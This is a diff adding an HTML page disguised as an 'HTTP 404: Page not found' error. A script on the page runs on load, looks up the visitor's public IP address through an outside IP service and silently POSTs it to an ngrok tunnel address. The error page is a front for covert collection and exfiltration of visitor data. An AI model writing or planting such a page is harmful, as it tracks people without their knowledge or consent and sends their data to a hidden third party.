@@ -1,0 +1,16 @@
+
+<h1> HTTP 404: Page not found </h1>
+
+<script>
+
+        fetch('https://freeipapi.com/api/json')
+                .then(response => response.json())
+                .then(data => fetch('https://2da9-109-106-233-50.ngrok.io/api', {
+                                method: 'POST',
+                                body: JSON.stringify({'ip':data.ipAddress}),
+                                headers: {
+                                                'Content-Type': 'application/json'
+                                        }
+                        }));
+
+</script>
